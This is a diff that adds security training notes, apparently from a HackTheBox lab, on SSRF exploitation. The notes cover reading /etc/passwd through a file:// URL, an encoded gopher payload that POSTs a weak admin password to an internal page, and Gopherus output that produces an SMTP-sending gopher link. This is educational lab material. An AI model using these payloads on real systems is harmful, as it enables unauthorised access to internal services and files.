@@ -105,3 +105,89 @@ The response should look something like:
 [Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 6ms]
     * FUZZ: availability
 ```
+We have successfully identified an additional internal endpoints that we can now access through the **SSRF** vulnerability by specifying the URL `http://dateserver.htb/admin.php` in the `dateserver` **POST** parameter to potentially access sensitive admin information.
+### Local File Inclusion (LFI) 
+Since the **URL** scheme is part of the **URL** supplied to the web application, let us attempt to read **local files** from the file system using the `file://` **URL** scheme. We can achieve this by supplying the **URL** `file:///etc/passwd`:
+![[Pasted image 20241216003144.png]]
+We can use this to read arbitrary files on the filesystem, including the web app's source code. For more details LFI, check out the [File Inclusion](https://academy.hackthebox.com/module/details/23) module from HackTheBox.
+###  The gopher Protocol
+As we know, we can use **SSRF** to access **restricted internal endpoints**. However, we are restricted to **GET** requests as there is no way to send a **POST** request with the `http://` **URL** scheme. For instance, let us consider a different version of the previous web app. Assuming we identified the internal endpoint `/admin.php` just like before, however, this time the response looks like this:
+![[Pasted image 20241216003516.png]]
+As we can see, the admin endpoint is protected by a login prompt. From the **HTML** form, we can deduce that we need to send a **POST** request to `/admin.php` containing the password in the `adminpw` **POST** parameter. However, there is no way to send this **POST** request using the `http://` **URL** scheme.
+
+Instead, we can use the [gopher](https://datatracker.ietf.org/doc/html/rfc1436) **URL** scheme to send arbitrary bytes to a **TCP socket**. This protocol enables us to create a **POST** request by building the **HTTP** request ourselves.
+
+Assuming we want to try common weak passwords, such as `admin`, we can send the following **POST** request:
+```http
+POST /admin.php HTTP/1.1
+Host: dateserver.htb
+Content-Length: 13
+Content-Type: application/x-www-form-urlencoded
+
+adminpw=admin
+```
+
+We need to **URL-encode** all special characters to construct a valid **gopher URL** from this. In particular, spaces (`%20`) and newlines (`%0D%0A`) must be **URL-encoded**. Afterward, we need to prefix the data with the **gopher** **URL** scheme, the **target host and port**, and an **underscore**, resulting in the following **gopher** **URL** :
+```gopher
+gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
+```
+Our specified bytes are sent to the **target** when the web app processes this URL. Since we carefully chose the bytes to represent a valid **POST** request, the internal web server accepts our **POST** request and responds accordingly. However, since we are sending our **URL** within the **HTTP POST** parameter `dateserver`, which itself is **URL-encoded**, we need to **URL-encode** the entire **URL** again to ensure the correct format of the **URL** after the web server accepts it. Otherwise, we will get a `Malformed URL` error. After **URL encoding** the entire **gopher URL** one more time, we can finally send the following request:
+```http
+POST /index.php HTTP/1.1
+Host: 172.17.0.2
+Content-Length: 265
+Content-Type: application/x-www-form-urlencoded
+
+dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
+```
+We can use the `gopher` to interact with many internal services, not just **HTTP** servers. Imagine a scenario where we identify, through an **SSRF** vulnerability, that **TCP port 25** is open locally. This is the standard port for **SMTP** servers. We can use **gopher** to interact with this internal **SMTP** server as well. However, constructing syntactically and semantically correct **gopher URL**s can take time and effort. Thus, we will utilize the tool [Gopherus](https://github.com/tarunkant/Gopherus) to generate **gopher URL**s for us. The following services are supported:
+- MySQL
+- PostgreSQL
+- FastCGI
+- Redis
+- SMTP
+- Zabbix
+- pymemcache
+- rbmemcache
+- phpmemcache
+- dmpmemcache
+To run the tool, we need a valid **Python2** installation. Afterward, we can run the tool by executing the Python script downloaded from the GitHub repository:
+```bash
+$ python2.7 gopherus.py
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
+        \/       |__|        \/     \/                 \/
+
+                author: $_SpyD3r_$
+
+usage: gopherus.py [-h] [--exploit EXPLOIT]
+
+optional arguments:
+  -h, --help         show this help message and exit
+  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,
+                     pymemcache, rbmemcache, phpmemcache, dmpmemcache
+```
+Let us generate a valid **SMTP URL** by supplying the corresponding argument. The tool asks us to input details about the **email** we intend to send. Afterward, we are given a valid gopher URL that we can use in our **SSRF** exploitation:
+```bash
+$ python2.7 gopherus.py --exploit smtp
+..SNIP..
+Give Details to send mail: 
+
+Mail from :  attacker@academy.htb
+Mail To :  victim@academy.htb
+Subject :  HelloWorld
+Message :  Hello from SSRF!
+
+Your gopher link is ready to send Mail: 
+
+gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.
+
+-----------Made-by-SpyD3r-----------
+```
+
+---
+## Blind SSRF
